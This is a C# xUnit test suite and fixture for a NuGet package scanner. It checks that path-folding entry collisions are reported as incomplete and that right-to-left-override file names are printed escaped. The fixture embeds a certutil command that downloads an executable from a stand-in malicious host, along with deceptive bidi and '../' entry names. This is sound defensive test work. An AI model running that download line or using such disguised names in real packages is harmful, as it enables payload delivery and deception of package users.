namespace Silvergun.CLI.Tests;

using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;

using Spectre.Console;

using Silvergun.CLI;
using Silvergun.CLI.Reports;
using Silvergun.Intel;
using Silvergun.PackageAnalysis.NuGet;
using Silvergun.PackageAnalysis.NuGet.Yara;

using Xunit;

/// <summary>
/// The report-and-exit-code half of two Round-A fixes, driven through a real <c>.nupkg</c> and the real
/// <see cref="PackageScanner"/> — because what could go wrong here is the WIRING, and a hand-built report would
/// prove nothing about it (the defects were precisely that no result was ever produced).
///
/// <list type="number">
/// <item><b>The folding collision.</b> Two declared entries folding to one extracted path used to leave
/// <c>UninventoriedEntryNames</c> empty, so the package read complete and the run exited <b>0</b> — with the
/// attacker choosing which of the two files' bytes survived on disk. Now the entry that could not claim the file is
/// reported, the package is incomplete, and the run exits <b>3</b>, in EITHER archive order.</item>
/// <item><b>Escaped entry names reach the terminal escaped.</b> An entry name carrying a bidirectional override is
/// written to disk verbatim on both platforms (measured 2026-08-22), so it reaches
/// <see cref="PackageAssembly.RelativePath"/>, <see cref="PackageScript.RelativePath"/> and
/// <see cref="ScriptFinding.RelativePath"/> — the three DTOs ADR 0031 decision 4 left raw. Asserted in BOTH render
/// modes, since <c>--rich</c> and the ASCII default are separate paths through the widgets.</item>
/// </list>
/// </summary>
public sealed class FoldingCollisionAndHostileNameCliTests : IClassFixture<FoldingCliPackageFixture>
{
    #region Constructors
    public FoldingCollisionAndHostileNameCliTests(FoldingCliPackageFixture fixture) => this.fixture = fixture;
    #endregion

    #region Methods — the folding collision: incomplete, named, exit 3, in both archive orders
    // Payload first: the benign twin is the entry that could not claim the file, so IT is the name disclosed.
    [Fact]
    public void ScanPackage_ForAFoldingCollisionWithThePayloadFirst_IsIncompleteAndNamesTheUnclaimedEntry()
    {
        var report = Scan(fixture.PayloadFirstPath);

        var assessment = CompletenessAssessment.ForPackage(report);

        Assert.False(assessment.IsComplete, "two entries folding to one extracted file must not read as complete.");
        Assert.Contains(
            assessment.Caveats,
            c => c.Contains("could not be analysed", StringComparison.Ordinal)
              && c.Contains("content/X.dll", StringComparison.Ordinal));
    }

    // Payload second: the same package, reversed central directory, and now the payload entry is the disclosed one.
    // Pinned so the reported name is a deliberate consequence of claim-once (archive order) rather than incidental.
    [Fact]
    public void ScanPackage_ForAFoldingCollisionWithThePayloadSecond_NamesTheOtherEntry()
    {
        var report = Scan(fixture.PayloadSecondPath);

        Assert.Contains(
            CompletenessAssessment.ForPackage(report).Caveats,
            c => c.Contains("content/../X.dll", StringComparison.Ordinal));
    }

    // The exit code, and the before/after of the defect in one test: the control package is the same package with
    // the folding twin removed — which is EXACTLY the report the pre-fix code produced for the colliding one,
    // because the shadowed entry simply vanished. So it used to exit 0, and it now exits 3, in both orders.
    [Fact]
    public void ScanPackageExitCode_ForAFoldingCollision_IsThreeInBothOrdersWhereTheUncollidedPackageIsZero()
    {
        var control = Scan(fixture.SingleEntryPath);

        Assert.True(CompletenessAssessment.ForPackage(control).IsComplete, "the control package must be complete.");
        Assert.Equal(0, Program.ScanPackageExitCode(control, strict: false, allowIncomplete: false));
        Assert.Equal(3, Program.ScanPackageExitCode(Scan(fixture.PayloadFirstPath), strict: false, allowIncomplete: false));
        Assert.Equal(3, Program.ScanPackageExitCode(Scan(fixture.PayloadSecondPath), strict: false, allowIncomplete: false));
    }

    // Exit 3 is a coverage statement, not a verdict, so it is ungated by --strict and un-gated BY
    // --allow-incomplete without the caveat being suppressed (ADR 0024).
    [Fact]
    public void ScanPackageExitCode_ForAFoldingCollision_IsUngatedByAllowIncompleteButTheCaveatRemains()
    {
        var report = Scan(fixture.PayloadFirstPath);

        Assert.Equal(3, Program.ScanPackageExitCode(report, strict: true, allowIncomplete: false));
        Assert.Equal(0, Program.ScanPackageExitCode(report, strict: false, allowIncomplete: true));
        Assert.NotEmpty(CompletenessAssessment.ForPackage(report).Caveats);
    }

    // ...and the footer says so: "Not verified", never "Clean". A package where one of two colliding entries was
    // never looked at has no business reading as clean, which is the whole of ADR 0030.
    [Fact]
    public void PackageRenderer_ForAFoldingCollision_ReportsNotVerifiedRatherThanClean()
    {
        var (console, writer) = AsciiConsole();

        PackageReportRenderer.Render(console, Scan(fixture.PayloadFirstPath), "Folded.nupkg");

        Assert.True(
            FooterHeadline.IsNotVerified(FooterHeadline.Of(writer)),
            $"the footer verdict was '{FooterHeadline.Of(writer)}'.");
    }
    #endregion

    #region Methods — a hostile entry name reaches the terminal ESCAPED, in both render modes
    // The rendered report shows the escape sequence, not the override. A raw U+202E here would reorder everything
    // after it on the line an operator reads — the display half of the forged-line attack.
    [Theory]
    [InlineData(true)]
    [InlineData(false)]
    public void PackageRenderer_ForABidiOverrideEntryName_PrintsTheEscapeSequenceLiterally(bool rich)
    {
        var (console, writer) = rich ? RichConsole() : AsciiConsole();

        PackageReportRenderer.Render(console, Scan(fixture.BidiPath), "Bidi.nupkg");

        var output = writer.ToString();
        Assert.Contains("pay\\u202eload.dll", output, StringComparison.Ordinal);
        Assert.Contains("pay\\u202eload.ps1", output, StringComparison.Ordinal);
    }

    // ...and nothing anywhere in either rendering is a raw control, C1, separator or bidi character. Line breaks
    // excepted: the report is made of lines, which is exactly why a name that can inject one matters.
    [Theory]
    [InlineData(true)]
    [InlineData(false)]
    public void PackageRenderer_ForABidiOverrideEntryName_PrintsNoRawHostileCharacter(bool rich)
    {
        var (console, writer) = rich ? RichConsole() : AsciiConsole();

        PackageReportRenderer.Render(console, Scan(fixture.BidiPath), "Bidi.nupkg");

        var output = writer.ToString();
        var offender = output.FirstOrDefault(IsHostile);
        Assert.True(offender == '\0', $"the rendered report carried raw U+{(int)offender:X4}.");

        // ESC is excluded from the hostile set because in --rich mode it is Spectre's own colour sequence, not
        // attacker text — so the ASCII path, which must contain none at all, asserts its absence separately.
        if (!rich)
            Assert.False(output.Contains((char)27), "default (non-rich) output must contain no ANSI escape byte.");
    }

    // The scan really did produce the paths this is about — a report with no assembly, script or script finding
    // would satisfy both assertions above vacuously.
    [Fact]
    public void ScanPackage_ForABidiOverrideEntryName_ProducesTheAssemblyScriptAndFindingPathsUnderTest()
    {
        var report = Scan(fixture.BidiPath);

        Assert.Single(report.Assemblies);
        Assert.Single(report.Scripts);
        Assert.NotEmpty(report.ScriptFindings);
    }
    #endregion

    #region Methods — helpers
    // A real, offline scan of a real .nupkg, with the two statuses a full CLI run would set normalized so the only
    // caveat in play is the one under test (the same reason UninventoriedEntryCompletenessTests does it).
    private static PackageCapabilityReport Scan(string nupkgPath)
    {
        var scan = PackageScanner.Scan(nupkgPath, resolveReferences: false, runYara: false);
        Assert.True(scan.IsSuccess, scan.Message);
        return scan.Value with
        {
            VulnerabilitiesStatus = VulnerabilityScanStatus.Completed,
            YaraScanStatus = YaraScanStatus.Completed,
        };
    }

    // C0 (minus the line breaks and tabs a report is made of, and minus ESC — see the rich-mode note above), DEL,
    // the C1 controls, the Unicode line/paragraph separators, and the bidi embeddings/overrides and isolates.
    private static bool IsHostile(char c) =>
        (c < ' ' && c is not ('\n' or '\r' or '\t' or (char)27))
        || c is >= (char)0x7F and <= (char)0x9F
             or (char)0x2028 or (char)0x2029
             or >= (char)0x202A and <= (char)0x202E
             or >= (char)0x2066 and <= (char)0x2069;

    private static (IAnsiConsole Console, StringWriter Writer) AsciiConsole()
    {
        var writer = new StringWriter();
        var console = AnsiConsole.Create(new AnsiConsoleSettings
        {
            Ansi = AnsiSupport.No,
            ColorSystem = ColorSystemSupport.NoColors,
            Out = new AnsiConsoleOutput(writer),
        });
        console.Profile.Capabilities.Unicode = false;
        console.Profile.Width = 240;
        return (console, writer);
    }

    private static (IAnsiConsole Console, StringWriter Writer) RichConsole()
    {
        var writer = new StringWriter();
        var console = AnsiConsole.Create(new AnsiConsoleSettings
        {
            Ansi = AnsiSupport.Yes,
            ColorSystem = ColorSystemSupport.Standard,
            Out = new AnsiConsoleOutput(writer),
        });
        console.Profile.Capabilities.Unicode = true;
        console.Profile.Width = 240;
        return (console, writer);
    }
    #endregion

    #region Fields
    private readonly FoldingCliPackageFixture fixture;
    #endregion
}

/// <summary>
/// Stages the <c>.nupkg</c> files for <see cref="FoldingCollisionAndHostileNameCliTests"/> with pure BCL zip — no
/// NuGet client, no network. The assembly payload is the findings-free <c>Silvergun.CLI.Tests.BenignFixture</c>
/// assembly, so an inventoried entry analyses cleanly and completely and any caveat comes from the lost entry
/// alone; the script payload carries a LOLBAS token so it produces real script findings to check the path of.
/// </summary>
public sealed class FoldingCliPackageFixture : IDisposable
{
    #region Constructors
    public FoldingCliPackageFixture()
    {
        rootDir = Path.Combine(Path.GetTempPath(), "silvergun-folding-cli-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(rootDir);
        var benign = File.ReadAllBytes(Path.Combine(AppContext.BaseDirectory, "Silvergun.CLI.Tests.BenignFixture.dll"));
        var script = Encoding.UTF8.GetBytes(MatchingPs1);

        PayloadFirstPath = Write("PkgFoldFirst", ("content/../X.dll", benign), ("content/X.dll", benign));
        PayloadSecondPath = Write("PkgFoldSecond", ("content/X.dll", benign), ("content/../X.dll", benign));
        SingleEntryPath = Write("PkgFoldNone", ("content/X.dll", benign));
        BidiPath = Write("PkgBidi", (BidiAssemblyEntry, benign), (BidiScriptEntry, script));
    }
    #endregion

    #region Properties
    /// <summary>U+202E RIGHT-TO-LEFT OVERRIDE — legal in a file name on both platforms, written verbatim by both.</summary>
    public const string Rlo = "\U0000202E";

    public const string BidiAssemblyEntry = "lib/net8.0/pay" + Rlo + "load.dll";
    public const string BidiScriptEntry = "tools/pay" + Rlo + "load.ps1";

    public string PayloadFirstPath { get; }
    public string PayloadSecondPath { get; }
    public string SingleEntryPath { get; }
    public string BidiPath { get; }
    #endregion

    #region Methods
    public void Dispose()
    {
        try
        {
            if (Directory.Exists(rootDir)) Directory.Delete(rootDir, recursive: true);
        }
        catch (Exception ex) when (ex is IOException or UnauthorizedAccessException) { /* best-effort temp cleanup */ }
    }

    // ZipArchive.CreateEntry stores the caller's name VERBATIM (no normalization), which is what lets a folding or
    // hostile entry name be staged at all.
    private string Write(string id, params (string Entry, byte[] Bytes)[] entries)
    {
        var nuspec = $"""
            <?xml version="1.0" encoding="utf-8"?>
            <package xmlns="{NuspecNamespace}">
              <metadata>
                <id>{id}</id>
                <version>1.0.0</version>
                <authors>Silvergun Tests</authors>
                <description>ADR 0030/0031 folding-collision and entry-name escaping test package.</description>
                <dependencies>
                  <group targetFramework="net8.0" />
                </dependencies>
              </metadata>
            </package>
            """;

        var path = Path.Combine(rootDir, $"{id}.1.0.0.nupkg");
        using (var stream = new FileStream(path, FileMode.Create, FileAccess.Write))
        using (var zip = new ZipArchive(stream, ZipArchiveMode.Create))
        {
            WriteEntry(zip, $"{id}.nuspec", Encoding.UTF8.GetBytes(nuspec));
            foreach (var (entry, bytes) in entries)
                WriteEntry(zip, entry, bytes);
        }
        return path;

        static void WriteEntry(ZipArchive zip, string name, byte[] bytes)
        {
            using var s = zip.CreateEntry(name).Open();
            s.Write(bytes, 0, bytes.Length);
        }
    }
    #endregion

    #region Fields
    private const string NuspecNamespace = "http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd";

    // A certutil LOLBAS line — the same token the package-analysis fixtures use, so the script produces at least
    // one real rule finding whose RelativePath this suite can assert on.
    private const string MatchingPs1 =
        "Start-Process certutil -ArgumentList '-urlcache','-f','http://malicious.example/a.exe'\n";

    private readonly string rootDir;
    #endregion
}
